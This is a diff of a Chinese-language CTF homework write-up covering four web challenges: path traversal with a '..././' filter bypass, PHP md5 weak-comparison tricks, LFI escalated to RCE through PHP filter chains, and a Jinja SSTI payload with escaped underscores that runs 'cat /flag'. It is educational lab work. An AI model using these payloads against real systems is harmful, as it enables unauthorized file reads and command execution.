@@ -2,21 +2,25 @@
 title: "【網路安全實務與社會實踐】作業二 Write-up"
 published: 2025-03-26T00:00:00.000Z
 description: ""
-tags: []
-category: "general"
+tags: [CTF, Learning, Writeups]
+category: Learning
 draft: false
 ---
 # 作業二 Write-up by owl_d
+
 ### pathwalker-waf2
+
 發現這題的path traversal重點在這個區間
+
 ```php
 <?php
       if (isset($_GET['page'])) {
         $safe_path = str_replace('../', '', $_GET['page']);
         echo file_get_contents("./page/".$safe_path.".php");
-      }      
+      }    
     ?>
 ```
+
 程式只有把 ../ 換掉
 所以可以使用 ..././ 的方式來 bypass
 ..././ 被換掉後會變成 ../ 就一樣可以達成回到上一層的目的
@@ -29,7 +33,9 @@ p.s. 這題沒辦法用 ..%2f 的方式來bypass，會被當成 ../ 過濾掉
 <!--more-->
 
 ### swirl
-Stage 1: 
+
+Stage 1:
+
 ```php
 <?php
 include('config.php');
@@ -51,12 +57,12 @@ if (isset($A) && isset($B))
     else die('ERROR: A == B');
 else die('ERROR: A, B should be given');
 ```
+
 弱型態比較，可以使用 md5(array型態) = NULL 的性質來達成
 payload: `?A[]=1&B[]=2`
 
-
-
 Stage 2:
+
 ```php
 <?php
 include('config.php');
@@ -77,21 +83,22 @@ if (isset($A) && isset($B))
     }
 else die('ERROR: A, B should be given');
 ```
+
 關鍵點應該在這：
 `md5($B) ? "QQ1" : md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2"`
 看起來有點複雜，但我們可以一部分一部分拆開來看
-`md5($B) ? "QQ1" : (目標要到這邊)` 
+`md5($B) ? "QQ1" : (目標要到這邊)`
 可以看出來 b 必須得是 false，才能繼續往下
 進到下一層後，
 `md5($A) == 0 ? "<a href=$stage3?page=swirl.php>Go to stage3</a>" : "QQ2"`
 所以 md5($A) 必須得是0
 整理一下條件：
+
 1. A 和 B 的值必須不同
 2. md5(A) 和 md5(B) 都必須等於 0
 3. md5(B) 必須為假值
 
 payload: `?A[]=1&B[]=2`
-
 
 有趣的事：
 意外發現 payload: `?A=true&B=false` 也行得通
@@ -99,7 +106,6 @@ payload: `?A[]=1&B[]=2`
 ![image](https://hackmd.io/_uploads/rJX2pUxTJg.png)
 發現程式根本就應該跳到 QQ1 就算 QQ1 被調過了應該也要跳去 QQ2
 到現在我還是不懂是什麼神奇的機制繞過的，我再研究看看
-
 
 Stage 3:
 .. 會變成 .
@@ -119,7 +125,6 @@ Stage 4:
 發現真的有回傳內容，代表 LFI 行得通
 ![image](https://hackmd.io/_uploads/B1P8D8gpkg.png)
 
-
 可是 👀=/flag 或者  👀=../../../flag.php 等等直接取 flag 的方式全部失敗
 所以勢必得要 RCE 才能印出 flag 了
 
@@ -133,9 +138,8 @@ p.s. 最後我還用了 `python3 php_filter_chain_generator.py --chain "<?php sy
 最後也看到了 flag 檔案有加後綴，所以 path traversal 其實不管用
 ![image](https://hackmd.io/_uploads/S1r4DUe6yx.png)
 
-
-
 ### SSTI-waf1
+
 一開始先送送看 `{{7*7}}` 發現真的回應 49
 那肯定得是個 SSTI 了！
 
@@ -149,9 +153,6 @@ p.s. 最後我還用了 `python3 php_filter_chain_generator.py --chain "<?php sy
 發現網頁回應：
 ![image](https://hackmd.io/_uploads/Sk3ycRJ6kx.png)
 
-
 有 flag 檔案，cat 一下便可以得到解答
-payload: 
+payload:
 `{{ cycler|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('cat /flag')|attr('read')() }}`
-
-
